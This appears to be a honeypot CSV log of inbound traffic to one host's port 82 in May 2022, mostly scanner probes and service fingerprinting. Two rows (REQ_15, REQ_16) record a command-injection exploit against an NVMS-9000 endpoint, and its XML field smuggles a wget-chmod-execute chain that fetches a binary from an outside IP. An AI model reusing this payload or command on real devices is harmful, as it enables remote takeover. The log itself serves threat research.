ID,ADDR,VALUE,TIME
REQ_1_P82,"('205.210.31.22', 60555)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:82\r\nUser-Agent: Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com\r\n\r\n'",2022-05-10 22:44:22.561089
REQ_2_P82,"('185.173.35.13', 57575)",b'GET / HTTP/1.1\r\nHost: 54.91.30.20:82\r\nUser-Agent: NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com\r\n\r\n',2022-05-11 10:58:10.636638
REQ_3_P82,"('139.162.190.203', 31430)","b'GET / HTTP/1.0\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\r\nAccept: */*\r\n\r\n\x00'",2022-05-11 11:28:42.897092
REQ_4_P82,"('143.198.32.47', 61953)",b'GET / HTTP/1.0\r\n\r\n',2022-05-16 14:22:28.585595
REQ_5_P82,"('170.106.115.253', 40702)",b'\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00',2022-05-16 17:22:26.935570
REQ_6_P82,"('205.210.31.142', 59665)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:82\r\nUser-Agent: Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com\r\n\r\n'",2022-05-16 19:15:46.046064
REQ_7_P82,"('142.93.42.254', 61953)",b'GET / HTTP/1.0\r\n\r\n',2022-05-23 11:45:17.475782
REQ_8_P82,"('66.240.205.34', 53688)",b'myversion|3.6 Public\r\n',2022-05-23 11:55:33.736451
REQ_9_P82,"('183.136.225.9', 53292)",b'GET / HTTP/1.1\r\nHost: 54.91.30.20:82\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n',2022-05-23 15:33:37.880150
REQ_10_P82,"('27.124.5.108', 46486)",b'\x16\x03\x01\x00\xae\x01\x00\x00\xaa\x03\x03\x07_r\x12\xfd\xebHx\x19\xca\xb7[\xe7\x9f\x90Z\xffN\xc5\x8b\xa59W\xcc\xf3M\xe7\x97\xb2}\x1f\xf3\x00\x00\x1a\xc0/\xc0+\xc0\x11\xc0\x07\xc0\x13\xc0\t\xc0\x14\xc0\n\x00\x05\x00/\x005\xc0\x12\x00\n\x01\x00\x00g3t\x00\x00\x00\x00\x00\x10\x00\x0e\x00\x00\x0b54.91.30.20\x00\x05\x00\x05\x01\x00\x00\x00\x00\x00\n\x00\x08\x00\x06\x00\x17\x00\x18\x00\x19\x00\x0b\x00\x02\x01\x00\x00\r\x00\x10\x00\x0e\x04\x01\x04\x03\x02\x01\x02\x03\x04\x01\x05\x01\x06\x01\xff\x01\x00\x01\x00\x00\x10\x00\x17\x00\x15\x02h2\x08http/1.1\x08spdy/3.1',2022-05-23 23:17:53.337676
REQ_11_P82,"('27.124.5.108', 46710)",b'',2022-05-23 23:18:09.933131
REQ_12_P82,"('27.124.5.108', 49434)",b'GET / HTTP/1.1\r\nHost: 54.91.30.20:82\r\nCookie: rememberMe=1\r\n\r\n',2022-05-23 23:18:11.143150
REQ_13_P82,"('27.124.5.108', 50146)",b'\r\n\r\n',2022-05-23 23:18:14.529264
REQ_14_P82,"('27.124.5.108', 51074)","b'-i\xbe\x06\xc8\x97\xf7\xdcy3\xb6\xcd`\xd4\xf2""\xb1q%\xd8\xddbZ\xb8\x85\xcb\xaac\x9bf\xdca\x83\x9eR\xfa\x01E\xc4\xaa\x12ntJo\xbc""\xf7\xb6\x17\xb30\xe5~\x88\xae1Y\xd0v\xd5\xdd\x98w\xc0\xad\x95\xd1\x92\xe5#\x99\xe5\xe9\xee\xd8\xcb\xba\x19\xb6\xe6w\xd8\x9f\xe0S\xa5\x15\xd4A\xce\xf4'",2022-05-23 23:18:20.379904
REQ_15_P82,"('120.237.210.179', 38157)","b'POST /editBlackAndWhiteList HTTP/1.1\r\nAccept-Encoding: identity\r\nContent-Length: 644\r\nAccept-Language: en-us\r\nHost: 54.91.30.20:88\r\nAccept: */*\r\nUser-Agent: Mozila/5.0\r\nConnection: close\r\nCache-Control: max-age=0\r\nContent-Type: text/xml\r\nAuthorization: Basic YWRtaW46ezEyMjEzQkQxLTY5QzctNDg2Mi04NDNELTI2MDUwMEQxREE0MH0=\r\n\r\n<?xml version=""1.0"" encoding=""utf-8""?><request version=""1.0"" systemType=""NVMS-9000"" clientType=""WEB""><types><filterTypeMode><enum>refuse</enum><enum>allow</enum></filterTypeMode><addressType><enum>ip</enum><enum>iprange</enum><enum>mac</enum></addressType></types><content><switch>true</switch><filterType type=""filterTypeMode"">refuse</filterType><filterList type=""list""><itemType><addressType type=""addressType""/></itemType><item><switch>true</switch><addressType>ip</addressType><ip>$(cd${IFS}/tmp;wget${IFS}http://92.118.230.134/garm7${IFS}-O-${IFS}>GSec;chmod${IFS}777${IFS}GSec;./GSec${IFS}tvt)</ip></item></filterList></content></request>\x11'",2022-05-24 10:11:12.328397
REQ_16_P82,"('220.81.214.99', 41631)","b'POST /editBlackAndWhiteList HTTP/1.1\r\nAccept-Encoding: identity\r\nContent-Length: 644\r\nAccept-Language: en-us\r\nHost: 54.91.30.20:81\r\nAccept: */*\r\nUser-Agent: Mozila/5.0\r\nConnection: close\r\nCache-Control: max-age=0\r\nContent-Type: text/xml\r\nAuthorization: Basic YWRtaW46ezEyMjEzQkQxLTY5QzctNDg2Mi04NDNELTI2MDUwMEQxREE0MH0=\r\n\r\n<?xml version=""1.0"" encoding=""utf-8""?><request version=""1.0"" systemType=""NVMS-9000"" clientType=""WEB""><types><filterTypeMode><enum>refuse</enum><enum>allow</enum></filterTypeMode><addressType><enum>ip</enum><enum>iprange</enum><enum>mac</enum></addressType></types><content><switch>true</switch><filterType type=""filterTypeMode"">refuse</filterType><filterList type=""list""><itemType><addressType type=""addressType""/></itemType><item><switch>true</switch><addressType>ip</addressType><ip>$(cd${IFS}/tmp;wget${IFS}http://92.118.230.134/garm7${IFS}-O-${IFS}>GSec;chmod${IFS}777${IFS}GSec;./GSec${IFS}tvt)</ip></item></filterList></content></request>\x0c'",2022-05-25 11:25:57.214870
REQ_17_P82,"('128.14.233.47', 22292)",b'',2022-05-25 11:46:28.736128
REQ_18_P82,"('128.14.233.47', 23886)",b'GET / HTTP/1.1\r\nUser-Agent: curl/7.29.0\r\nHost: 54.91.30.20\r\nAccept: */*\r\n\r\n',2022-05-25 11:46:29.278138
REQ_19_P82,"('128.14.233.47', 24400)",b'OPTIONS / HTTP/1.0\r\n\r\n',2022-05-25 11:46:31.653094
REQ_20_P82,"('128.14.233.47', 24852)",b'GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0\r\n\r\n',2022-05-25 11:46:34.056442
REQ_21_P82,"('128.14.233.47', 25276)",b'\r\n\r\n',2022-05-25 11:46:36.400067
REQ_22_P82,"('128.14.233.47', 25606)","b""\x16\x03\x01\x00\xee\x01\x00\x00\xea\x03\x03\x10\xb8\x00;\xae`\x99\x89\xa8XlF\xea9>#'\x1f\xfc\x83\xd3\x0f\x1f\xe2\xd1\xde\xfc7\xca\xe4\x8b\xf9 E\xa9R\xc9\xb4X\xf9\x8c\x18_Bk?T|\x08\x7f\xc2\xd3\xa6\xb0\xd0:\x15+8\r\r\x1e\xd1>\x86\x00&\xc0/\xc00\xc0+\xc0,\xcc\xa8\xcc\xa9\xc0\x13\xc0\t\xc0\x14\xc0\n\x00\x9c\x00\x9d\x00/\x005\xc0\x12\x00\n\x13\x01\x13\x03\x13\x02\x01\x00\x00{\x00\x05\x00\x05\x01\x00\x00\x00\x00\x00\n\x00\n\x00\x08\x00\x1d\x00\x17\x00\x18\x00\x19\x00\x0b\x00\x02\x01\x00\x00\r\x00\x1a\x00\x18\x08\x04\x04\x03\x08\x07\x08\x05\x08\x06\x04\x01\x05\x01\x06\x01\x05\x03\x06\x03\x02\x01\x02\x03\xff\x01\x00\x01\x00\x00\x12\x00\x00\x00+\x00\t\x08\x03\x04\x03\x03\x03\x02\x03\x01\x003\x00&\x00$\x00\x1d\x00 >s\xa2\xceO\x1bP\xf8x#\xf6\x11l&\xed\xc1\xf4q\xa0\xf2=\x91O9\x86,\xea\x03DC\x9f4""",2022-05-25 11:46:38.689064
REQ_23_P82,"('128.14.233.47', 25852)",b'OPTIONS / RTSP/1.0\r\n\r\n',2022-05-25 11:46:40.999347
REQ_24_P82,"('128.14.233.47', 26134)",b'\x80\x00\x00(r\xfe\x1d\x13\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa0\x00\x01\x97|\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',2022-05-25 11:46:43.400916
REQ_25_P82,"('128.14.233.47', 26428)",b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n\x00\x00\x00\x04\x00\x00\x00\x00\x00',2022-05-25 11:46:45.758652
REQ_26_P82,"('128.14.233.47', 26790)",b'\x00*(\xff\x01 \x00\x01\x00\x00\x00\x00\x00\x01\x03www\x05baidu\x03com\x00\x00\x01\x00\x01\x00\x00)\x10\x00\x00\x00\x00\x00\x00\x00',2022-05-25 11:46:48.097685
REQ_27_P82,"('128.14.233.47', 27078)",b'\x00\x1e\x00\x06\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x03',2022-05-25 11:46:50.481511
REQ_28_P82,"('128.14.233.47', 27342)",b'\x00\x0c\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00',2022-05-25 11:46:52.808456
REQ_29_P82,"('128.14.233.47', 27594)",b'AMQP\x00\x00\t\x01',2022-05-25 11:46:55.118204
REQ_30_P82,"('128.14.233.47', 27890)",b'HELP\r\n',2022-05-25 11:46:57.441795
REQ_31_P82,"('128.14.233.47', 28128)","b'\x16\x03\x00\x00S\x01\x00\x00O\x03\x00?G\xd7\xf7\xba,\xee\xea\xb2`~\xf3\x00\xfd\x82{\xb9\xd5\x96\xc8w\x9b\xe6\xc4\xdb<=\xdbo\xef\x10n\x00\x00(\x00\x16\x00\x13\x00\n\x00f\x00\x05\x00\x04\x00e\x00d\x00c\x00b\x00a\x00`\x00\x15\x00\x12\x00\t\x00\x14\x00\x11\x00\x08\x00\x06\x00\x03\x01\x00'",2022-05-25 11:46:59.804024
REQ_32_P82,"('128.14.233.47', 28372)",b'\x03\x00\x00*%\xe0\x00\x00\x00\x00\x00Cookie: mstshash=nmap\r\n\x01\x00\x08\x00\x03\x00\x00\x00',2022-05-25 11:47:02.104011
REQ_33_P82,"('128.14.233.47', 28560)",b'\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x00\x00\x00\x00',2022-05-25 11:47:04.414473
REQ_34_P82,"('128.14.233.47', 28724)","b'\x16\x03\x00\x00i\x01\x00\x00e\x03\x03U\x1c\xa7\xe4random1random2random3random4\x00\x00\x0c\x00/\x00\n\x00\x13\x009\x00\x04\x00\xff\x01\x00\x000\x00\r\x00,\x00*\x00\x01\x00\x03\x00\x02\x06\x01\x06\x03\x06\x02\x02\x01\x02\x03\x02\x02\x03\x01\x03\x03\x03\x02\x04\x01\x04\x03\x04\x02\x01\x01\x01\x03\x01\x02\x05\x01\x05\x03\x05\x02'",2022-05-25 11:47:06.715254
REQ_35_P82,"('128.14.233.47', 28934)",b'\x00\x00\x00qj\x81n0\x81k\xa1\x03\x02\x01\x05\xa2\x03\x02\x01\n\xa4\x81^0\\\xa0\x07\x03\x05\x00P\x80\x00\x10\xa2\x04\x1b\x02NM\xa3\x170\x15\xa0\x03\x02\x01\x00\xa1\x0e0\x0c\x1b\x06krbtgt\x1b\x02NM\xa5\x11\x18\x0f19700101000000Z\xa7\x06\x02\x04\x1f\x1e\xb9\xd9\xa8\x170\x15\x02\x01\x12\x02\x01\x11\x02\x01\x10\x02\x01\x17\x02\x01\x01\x02\x01\x03\x02\x01\x02',2022-05-25 11:47:09.026070
REQ_36_P82,"('128.14.233.47', 29240)",b'\x00\x00\x00\xa4\xffSMBr\x00\x00\x00\x00\x08\x01@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x06\x00\x00\x01\x00\x00\x81\x00\x02PC NETWORK PROGRAM 1.0\x00\x02MICROSOFT NETWORKS 1.03\x00\x02MICROSOFT NETWORKS 3.0\x00\x02LANMAN1.0\x00\x02LM1.2X002\x00\x02Samba\x00\x02NT LANMAN 1.0\x00\x02NT LM 0.12\x00',2022-05-25 11:47:11.569892
REQ_37_P82,"('128.14.233.47', 29520)",b'l\x00\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00',2022-05-25 11:47:13.903695
REQ_38_P82,"('128.14.233.47', 29758)",b'\x01default\n',2022-05-25 11:47:16.204335
REQ_39_P82,"('128.14.233.47', 30100)",b'0\x84\x00\x00\x00-\x02\x01\x07c\x84\x00\x00\x00$\x04\x00\n\x01\x00\n\x01\x00\x02\x01\x00\x02\x01d\x01\x01\x00\x87\x0bobjectClass0\x84\x00\x00\x00\x00',2022-05-25 11:47:18.522565
REQ_40_P82,"('128.14.233.47', 30338)",b'0\x0c\x02\x01\x01`\x07\x02\x01\x02\x04\x00\x80\x00',2022-05-25 11:47:20.875397
REQ_41_P82,"('128.14.233.47', 30602)",b'OPTIONS sip:nm SIP/2.0\r\nVia: SIP/2.0/TCP nm;branch=foo\r\nFrom: <sip:nm@nm>;tag=root\r\nTo: <sip:nm2@nm2>\r\nCall-ID: 50000\r\nCSeq: 42 OPTIONS\r\nMax-Forwards: 70\r\nContent-Length: 0\r\nContact: <sip:nm@nm>\r\nAccept: application/sdp\r\n\r\n',2022-05-25 11:47:23.162413
REQ_42_P82,"('128.14.233.47', 30776)",b'TNMP\x04\x00\x00\x00TNME\x00\x00\x04\x00',2022-05-25 11:47:25.522090
REQ_43_P82,"('128.14.233.47', 30952)",b'\x03\x00\x00\x0b\x06\xe0\x00\x00\x00\x00\x00',2022-05-25 11:47:27.894463
REQ_44_P82,"('128.14.233.47', 31190)",b'\x06\x83\xa4Join\xc3\xa5Nodes\x01\xacUserStateLen\x00\x87\xa4Addr\xb0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xc0\xa88\x01\xabIncarnation\x01\xa4Meta\xc0\xa4Name\xafDESKTOP-NR8TTVR\xa4Port\xcd\x1f\n\xa5State\x00\xa3Vsn\xa6\x01\x05\x02\x00\x00\x00',2022-05-25 11:47:30.190706
REQ_45_P82,"('128.14.233.47', 31320)",b'\x00\x9c\x00\x01\x1a+<M\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\xff\xff\x00\x01none\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ppap\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',2022-05-25 11:47:32.491907
REQ_46_P82,"('128.14.233.47', 31476)",b'DmdT\x00\x00\x00\x17\x00\x00\x00\x01\x00\x00\x00\x00\x11\x11\x00\xff\x01\xff\x13',2022-05-25 11:47:34.790432
